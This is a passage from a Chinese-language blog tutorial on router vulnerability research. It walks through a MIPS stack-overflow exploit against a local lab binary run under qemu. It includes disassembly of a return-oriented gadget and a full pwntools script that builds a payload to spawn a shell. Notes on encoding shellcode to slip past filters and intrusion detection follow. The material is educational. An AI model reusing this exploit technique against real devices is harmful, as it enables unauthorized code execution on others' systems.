+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00447724 27 A5 02 A0                   addiu   $a1, $sp, 672</span><br><span class="line">.text:00447728 8F A4 04 F0                   lw      $a0, 1264($sp)</span><br><span class="line">.text:0044772C 02 20 30 25                   move    $a2, $s1</span><br><span class="line">.text:00447730 24 02 10 32                   li      $v0, 4146</span><br><span class="line">.text:00447734 00 00 00 0C                   syscall</span><br><span class="line">.text:00447738 8F BF 04 EC                   lw      $ra, 1260($sp)</span><br><span class="line">.text:0044773C 8F BE 04 E8                   lw      $fp, 1256($sp)</span><br><span class="line">.text:00447740 8F B7 04 E4                   lw      $s7, 1252($sp)</span><br><span class="line">.text:00447744 8F B6 04 E0                   lw      $s6, 1248($sp)</span><br><span class="line">.text:00447748 8F B5 04 DC                   lw      $s5, 1244($sp)</span><br><span class="line">.text:0044774C 8F B4 04 D8                   lw      $s4, 1240($sp)</span><br><span class="line">.text:00447750 8F B3 04 D4                   lw      $s3, 1236($sp)</span><br><span class="line">.text:00447754 8F B2 04 D0                   lw      $s2, 1232($sp)</span><br><span class="line">.text:00447758 8F B1 04 CC                   lw      $s1, 1228($sp)</span><br><span class="line">.text:0044775C 8F B0 04 C8                   lw      $s0, 1224($sp)</span><br><span class="line">.text:00447760 03 E0 00 08                   jr      $ra</span><br></pre></td></tr></table></figure>
+<p>这段代码不仅可以帮我们重写 <code>$a1</code> 寄存器，还能改写 <code>$ra</code> 寄存器，最后 <code>jr $ra</code>跳转到 <code>do_system_0</code> 函数地址，但是因为这个 gadget 修改了 <code>$fp</code> 等寄存器，所以利用起来有局限性，搞明白机制就行吧。</p>
+<p>在执行完函数返回指令后，当前就在 <code>$sp</code> 指向的地方，我们可以看出，<code>addiu   $a1, $sp, 672</code>，可以在 <code>sp + 672</code> 的位置写入 <code>sh</code>，然后在对应的位置给寄存器赋值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># saved_ra - dest = 404</span></span><br><span class="line"></span><br><span class="line">set_a1_addr = struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, <span class="number">0x00447724</span>)</span><br><span class="line"><span class="comment"># .text:00447724 27 A5 02 A0                   addiu   $a1, $sp, 672</span></span><br><span class="line"><span class="comment"># .text:00447728 8F A4 04 F0                   lw      $a0, 1264($sp)</span></span><br><span class="line"><span class="comment"># .text:0044772C 02 20 30 25                   move    $a2, $s1</span></span><br><span class="line"><span class="comment"># .text:00447730 24 02 10 32                   li      $v0, 4146</span></span><br><span class="line"><span class="comment"># .text:00447734 00 00 00 0C                   syscall</span></span><br><span class="line"><span class="comment"># .text:00447738 8F BF 04 EC                   lw      $ra, 1260($sp)</span></span><br><span class="line"><span class="comment"># .text:0044773C 8F BE 04 E8                   lw      $fp, 1256($sp)</span></span><br><span class="line"><span class="comment"># .text:00447740 8F B7 04 E4                   lw      $s7, 1252($sp)</span></span><br><span class="line"><span class="comment"># .text:00447744 8F B6 04 E0                   lw      $s6, 1248($sp)</span></span><br><span class="line"><span class="comment"># .text:00447748 8F B5 04 DC                   lw      $s5, 1244($sp)</span></span><br><span class="line"><span class="comment"># .text:0044774C 8F B4 04 D8                   lw      $s4, 1240($sp)</span></span><br><span class="line"><span class="comment"># .text:00447750 8F B3 04 D4                   lw      $s3, 1236($sp)</span></span><br><span class="line"><span class="comment"># .text:00447754 8F B2 04 D0                   lw      $s2, 1232($sp)</span></span><br><span class="line"><span class="comment"># .text:00447758 8F B1 04 CC                   lw      $s1, 1228($sp)</span></span><br><span class="line"><span class="comment"># .text:0044775C 8F B0 04 C8                   lw      $s0, 1224($sp)</span></span><br><span class="line"><span class="comment"># .text:00447760 03 E0 00 08                   jr      $ra</span></span><br><span class="line">set_do_system_addr = p32(<span class="number">0x004008F4</span>, endian = <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">set_sp_addr = p32(<span class="number">0x408004E0</span>, endian = <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&#x27;sh&#x27;</span></span><br><span class="line">cmd += <span class="string">b&#x27;\x00&#x27;</span> * ((<span class="number">4</span> - <span class="built_in">len</span>(cmd)) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">404</span> <span class="comment"># padding</span></span><br><span class="line">payload += set_a1_addr <span class="comment"># a1 -&gt; cmd </span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">672</span> <span class="comment"># padding</span></span><br><span class="line">payload += cmd</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">580</span> <span class="comment"># 1256 - len(cmd) - 672</span></span><br><span class="line">payload += set_sp_addr</span><br><span class="line">payload += set_do_system_addr</span><br><span class="line">payload += <span class="string">b&#x27;BBBB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwd&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(payload)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-mips-static&#x27;</span>, <span class="string">&#x27;./vuln_system&#x27;</span>])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240425012002313.png" alt="image-20240425012002313"></p>
+<h1 id="MIPS-shellcode-开发"><a href="#MIPS-shellcode-开发" class="headerlink" title="MIPS shellcode 开发"></a>MIPS shellcode 开发</h1><p>MIPS 可以使用 <code>syscall</code> 来实现系统调用，具体方法为：用 <code>$v0</code> 保存需要执行的系统调用的调用号，并按照 MIPS 调用规则构造将要执行的系统调用参数，伪代码为 <code>syscall($v0, $a0,$a1,$a2...)</code></p>
+<p>查看系统调用号：<code>/usr/include/mips-linux-gnu/asm/unistd.h</code>，或者 <code>/usr/mips-linux-gnu/include/asm/unistd.h</code></p>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240424160121005.png" alt="image-20240424160121005"></p>
+<p>shellcode编码优化包括指令优化和shellcode编码。 指令优化：指令优化是指通过选择一些特殊的指令避免在shellcode中直接生成坏字符。</p>
+<p>通常来说，shellcode可能会受到限制：首先，所有的字符串函数都会对 <code>NULL</code> 字节进行限制；其次，在某些处理流程中可能会限制 <code>0x0D（\r）、0x0A（\n）、或者0x20（空格）</code>字符；最后，有些函数会要求shellcode必须为可见字符（ascii）或Unicode值。有些时候，还会受到基于特征的IDS系统对shellcode的拦截。</p>
+<p>绕过以上限制的方法主要有两个：指令优化及shellcode 编码。后者更为通用。</p>
+<p>shellcode 编码通常包含以下三种：base64编码、alpha_upper编码、xor编码。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://example.com">EPs1l0h</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/">https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://example.com" target="_blank">EPs1l0h's Castle</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/22/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/"><img class="next-cover" src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" onerror="onerror=null;src='/img/404.gif'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">安卓逆向初探</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">EPs1l0h</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/EPs1l0h"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Spears shall be shaken! Shields shall be splintered! A sword day! A red day! Ere the sun rises!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%89%8D%E7%BD%AE%E8%8A%9D%E5%A3%AB"><span class="toc-number">1.</span> <span class="toc-text">一些前置芝士</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1-MIPS-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E5%AE%9E%E8%B7%B5"><span class="toc-number">2.</span> <span class="toc-text">一次 MIPS 缓冲区溢出利用实践</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crash"><span class="toc-number">2.1.</span> <span class="toc-text">Crash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96saved-ra%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%BF%9B%E8%80%8C%E8%A6%86%E7%9B%96RA%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">栈溢出覆盖saved_ra局部变量进而覆盖RA寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用开发过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81PC"><span class="toc-number">2.3.1.</span> <span class="toc-text">劫持PC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB"><span class="toc-number">2.3.2.</span> <span class="toc-text">确定偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%94%BB%E5%87%BB%E9%80%94%E5%BE%84"><span class="toc-number">2.3.3.</span> <span class="toc-text">确定攻击途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE"><span class="toc-number">2.3.4.</span> <span class="toc-text">构建漏洞攻击数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MIPS-shellcode-%E5%BC%80%E5%8F%91"><span class="toc-number">3.</span> <span class="toc-text">MIPS shellcode 开发</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/" title="路由器漏洞挖掘初探"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="路由器漏洞挖掘初探"/></a><div class="content"><a class="title" href="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/" title="路由器漏洞挖掘初探">路由器漏洞挖掘初探</a><time datetime="2024-04-18T08:59:23.000Z" title="发表于 2024-04-18 16:59:23">2024-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/22/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/" title="安卓逆向初探"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="安卓逆向初探"/></a><div class="content"><a class="title" href="/2024/03/22/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/" title="安卓逆向初探">安卓逆向初探</a><time datetime="2024-03-22T05:25:14.000Z" title="发表于 2024-03-22 13:25:14">2024-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/19/BeginCTF2024-re-wp/" title="BeginCTF2024-re-wp"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover2.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="BeginCTF2024-re-wp"/></a><div class="content"><a class="title" href="/2024/02/19/BeginCTF2024-re-wp/" title="BeginCTF2024-re-wp">BeginCTF2024-re-wp</a><time datetime="2024-02-19T06:55:40.000Z" title="发表于 2024-02-19 14:55:40">2024-02-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/12/L3HCTF-2024-%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="L3HCTF-2024-部分复现"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover3.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="L3HCTF-2024-部分复现"/></a><div class="content"><a class="title" href="/2024/02/12/L3HCTF-2024-%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="L3HCTF-2024-部分复现">L3HCTF-2024-部分复现</a><time datetime="2024-02-12T07:03:06.000Z" title="发表于 2024-02-12 15:03:06">2024-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/05/%E8%93%9D%E5%B8%BD%E6%9D%AF2022%E5%8D%8A%E5%86%B3%E8%B5%9BWP%E2%80%94%E2%80%94%E8%A6%81%E8%93%9D%E5%B8%BD%E4%B8%8D%E8%A6%81%E7%BB%BF%E5%B8%BD/" title="蓝帽杯(取证杯）2022半决赛WP"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover2.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="蓝帽杯(取证杯）2022半决赛WP"/></a><div class="content"><a class="title" href="/2023/10/05/%E8%93%9D%E5%B8%BD%E6%9D%AF2022%E5%8D%8A%E5%86%B3%E8%B5%9BWP%E2%80%94%E2%80%94%E8%A6%81%E8%93%9D%E5%B8%BD%E4%B8%8D%E8%A6%81%E7%BB%BF%E5%B8%BD/" title="蓝帽杯(取证杯）2022半决赛WP">蓝帽杯(取证杯）2022半决赛WP</a><time datetime="2023-10-05T08:20:32.725Z" title="发表于 2023-10-05 16:20:32">2023-10-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By EPs1l0h</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js"></script><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/'
+    this.page.identifier = '/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/'
+    this.page.title = '路由器漏洞挖掘初探'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Disqus' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><div class="aplayer no-destroy" data-id="2981528901" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
